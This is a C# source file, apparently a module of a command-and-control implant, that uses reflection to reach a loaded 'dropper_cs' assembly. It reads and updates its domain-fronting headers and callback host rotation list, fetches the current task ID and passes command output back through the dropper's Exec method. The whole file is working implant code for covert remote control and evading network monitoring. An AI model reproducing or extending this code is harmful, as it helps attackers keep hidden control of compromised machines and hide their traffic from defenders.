using System;
using System.Linq;
using System.Reflection;
using System.Text.RegularExpressions;

namespace Core.Common
{
    class Comms
    {

        public static string[] GetDF()
        {
            Assembly lTyp = null;
            try
            {
                lTyp = AppDomain.CurrentDomain.GetAssemblies().LastOrDefault(assembly => assembly.GetName().Name == "dropper_cs");
            }
            catch (NullReferenceException)
            {

            }
            catch (Exception e)
            {
                Console.WriteLine($"[-] Error in finding dropper_cs: {e}");
            }
            try
            {
                var x = (string[])lTyp.GetType("Program").GetField("dfhead").GetValue(null);
                return x;
            }
            catch (Exception e)
            {
                Console.WriteLine($"[-] Error in setting dfhead in dropper_cs: {e}");
                return new string[] { "null" };
            }
        }

        static void SetDF(string[] dfhead)
        {
            Assembly lTyp = null;
            try
            {
                lTyp = AppDomain.CurrentDomain.GetAssemblies().LastOrDefault(assembly => assembly.GetName().Name == "dropper_cs");
            }
            catch (NullReferenceException)
            {

            }
            catch (Exception e)
            {
                Console.WriteLine($"[-] Error in finding dropper_cs: {e}");
            }
            try
            {
                lTyp.GetType("Program").GetField("dfhead", BindingFlags.Public | BindingFlags.Static).SetValue(null, dfhead);
            }
            catch (Exception e)
            {
                Console.WriteLine($"[-] Error in setting dfhead in dropper_cs: {e}");
            }
        }

        public static string[] GetRotate()
        {
            Assembly lTyp = null;
            try
            {
                lTyp = AppDomain.CurrentDomain.GetAssemblies().LastOrDefault(assembly => assembly.GetName().Name == "dropper_cs");
            }
            catch (NullReferenceException)
            {

            }
            catch (Exception e)
            {
                Console.WriteLine($"[-] Error in finding dropper_cs: {e}");
            }
            try
            {
                var x = (string[])lTyp.GetType("Program").GetField("rotate").GetValue(null);
                return x;
            }
            catch (Exception e)
            {
                Console.WriteLine($"[-] Error in setting rotate in dropper_cs: {e}");
                return new string[] { "null" };
            }
        }

        static void SetRotate(string[] rotate)
        {
            Assembly lTyp = null;
            try
            {
                lTyp = AppDomain.CurrentDomain.GetAssemblies().LastOrDefault(assembly => assembly.GetName().Name == "dropper_cs");
            }
            catch (NullReferenceException)
            {

            }
            catch (Exception e)
            {
                Console.WriteLine($"[-] Error in finding dropper_cs: {e}");
            }
            try
            {
                lTyp.GetType("Program").GetField("rotate", BindingFlags.Public | BindingFlags.Static).SetValue(null, rotate);
            }
            catch (Exception e)
            {
                Console.WriteLine($"[-] Error in setting rotate in dropper_cs: {e}");
            }
        }

        public static void Rotate(string cmd)
        {
            try
            {
                if (!String.IsNullOrEmpty(cmd))
                {
                    SetRotate(cmd.Split(','));
                    Exec("[+] Rotate enabled");
                }
                else
                {
                    Exec("[-] Rotation update failed");
                }
            }
            catch (Exception e)
            {
                Exec($"[-] Rotation update failed: {e}");
            }
        }

        public static void DFUpdate(string cmd)
        {
            try
            {
                if (!String.IsNullOrEmpty(cmd))
                {
                    SetDF(cmd.Split(','));
                    Exec("[+] DomainFront updated");
                }
                else
                {
                    Exec("[-] DomainFront update failed");
                }
            }
            catch (Exception e)
            {
                Exec($"[-] DomainFront update failed: {e}");
            }
        }
        public static String GetTaskId()
        {
            String taskId = null;
            Assembly lTyp = null;
            try
            {
                lTyp = AppDomain.CurrentDomain.GetAssemblies().LastOrDefault(assembly => assembly.GetName().Name.Contains("dropper_cs"));
            }
            catch (NullReferenceException e)
            {
                Console.WriteLine($"NullAsm: {e}");
            }
            catch (Exception e)
            {
                Console.WriteLine(e);
            }
            try
            {
                taskId = lTyp.GetType("Program").GetField("taskId").GetValue(null).ToString();
            }
            catch (NullReferenceException e)
            {
                Console.WriteLine($"Null taskID: {e.Message}");
            }
            catch (Exception e)
            {
                Console.WriteLine(e);
            }
            return taskId;
        }
        public static void Exec(String output, byte[] outputBytes = null, String taskId = null)
        {
            if (string.IsNullOrEmpty(taskId))
            {
                taskId = GetTaskId();                              
            }           
            try
            {
                var lTypCM = AppDomain.CurrentDomain.GetAssemblies().LastOrDefault(assembly => assembly.GetName().Name.Contains("dropper_cs"));
                if (outputBytes != null)
                {
                    lTypCM.GetType("Program").InvokeMember("Exec", BindingFlags.Public | BindingFlags.InvokeMethod | BindingFlags.Static, null, null, new object[] { null, taskId, null, outputBytes });
                }
                else
                {
                    lTypCM.GetType("Program").InvokeMember("Exec", BindingFlags.Public | BindingFlags.InvokeMethod | BindingFlags.Static, null, null, new object[] { output, taskId, null, null });
                }
            }
            catch (NullReferenceException e)
            {
                Console.WriteLine($"{e}");
                if (!string.IsNullOrEmpty(output))
                {                    
                    Console.WriteLine($"{output}");
                }               
            }
            catch (Exception e)
            {
                Console.WriteLine(e);
            }
        }
    }
}
